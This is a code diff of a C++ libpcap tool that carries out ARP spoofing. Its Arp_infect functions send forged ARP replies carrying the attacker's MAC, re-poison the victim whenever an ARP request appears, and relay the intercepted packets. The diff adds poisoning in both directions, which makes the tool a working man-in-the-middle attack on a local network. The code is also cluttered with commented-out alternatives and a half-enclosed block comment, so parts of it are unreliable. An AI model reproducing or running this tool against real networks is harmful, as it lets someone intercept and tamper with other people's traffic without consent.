@@ -225,8 +225,10 @@ void Arp_infect(pcap_t* handle,Mac sender_mac,Mac attacker_mac,Ip sender_ip,Ip t
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = attacker_mac;
+    //packet.arp_.smac_ = sender_mac;
     packet.arp_.sip_ = htonl(target_ip);
-    packet.arp_.tmac_ =sender_mac;
+    packet.arp_.tmac_ = sender_mac;
+    //packet.arp_.tmac_ = attacker_mac;
     packet.arp_.tip_ = htonl(sender_ip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
@@ -251,30 +253,41 @@ void Arp_infect_Relay(pcap_t* handle,Mac sender_mac,Mac attacker_mac,Ip sender_i
 
         PEthHdr arp_eth_hdr = (PEthHdr)packet_data;
         PArpHdr arp_ip_hdr = (PArpHdr)(packet_data + sizeof(EthHdr));
-
+	
         if(arp_eth_hdr->type() == EthHdr::Arp && arp_ip_hdr->op()==ArpHdr::Request && arp_ip_hdr->sip()==sender_ip && arp_ip_hdr->tip()==target_ip )
         {
             printf("arp cache is terminated\n");
+            //Arp_infect(handle,sender_mac,attacker_mac,target_ip,sender_ip);
             Arp_infect(handle,sender_mac,attacker_mac,sender_ip,target_ip);
+            //Arp_infect(handle,sender_mac,attacker_mac,target_ip,sender_ip);
         }
 
-        if(arp_eth_hdr->type() == EthHdr::Arp && arp_ip_hdr->op()==ArpHdr::Request && arp_ip_hdr->sip()==target_ip)
+	else if(arp_eth_hdr->type() == EthHdr::Arp && arp_ip_hdr->op()==ArpHdr::Request && arp_ip_hdr->sip()==target_ip)
         {
             printf("target requests packet \n");
-            Arp_infect(handle,sender_mac,attacker_mac,sender_ip,target_ip);
-        }
-
-        if(eth_hdr->type() == EthHdr::Ip4 &&Ip(ntohl(ip_hdr->ip_src.s_addr))==sender_ip &&Ip(ntohl(ip_hdr->ip_dst.s_addr))==target_ip)
-        {
-            printf("packet_relay\n");
+            Arp_infect(handle,sender_mac,attacker_mac,target_ip,sender_ip);
+            //Arp_infect(handle,target_mac,attacker_mac,sender_ip,target_ip);
+        }	
+	
+        //Arp_infect(handle,sender_mac,attacker_mac,sender_ip,target_ip);/*
+        //if(eth_hdr->type() == EthHdr::Ip4 &&Ip(ntohl(ip_hdr->ip_src.s_addr))==sender_ip &&Ip(ntohl(ip_hdr->ip_dst.s_addr))==target_ip){
+	else{
             eth_hdr->smac_=attacker_mac;
             eth_hdr->dmac_=target_mac;
             int res = pcap_sendpacket(handle, packet_data, sizeof(EthHdr)+ntohs(ip_hdr->ip_len));
             if (res != 0)
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-        }
+        }/*
+        if(eth_hdr->type() == EthHdr::Ip4 &&Ip(ntohl(ip_hdr->ip_src.s_addr))==target_ip &&Ip(ntohl(ip_hdr->ip_dst.s_addr))==sender_ip)
+        {
+            printf("packet_relay\n");
+            eth_hdr->smac_=attacker_mac;
+            eth_hdr->dmac_=sender_mac;
+            int res = pcap_sendpacket(handle, packet_data, sizeof(EthHdr)+ntohs(ip_hdr->ip_len));
+            if (res != 0)
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        }*/
     }
-
 }
 
 void flow(char* dev,Flow_info& flow_info)
@@ -285,6 +298,7 @@ void flow(char* dev,Flow_info& flow_info)
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 
     Arp_infect(handle,flow_info.sender_mac,attacker.attacker_mac,flow_info.sender_ip,flow_info.target_ip);
+    Arp_infect(handle,flow_info.target_mac,attacker.attacker_mac,flow_info.target_ip,flow_info.sender_ip);
     Arp_infect_Relay(handle,flow_info.sender_mac,attacker.attacker_mac,flow_info.sender_ip,flow_info.target_ip,flow_info.target_mac);
     pcap_close(handle);
 }
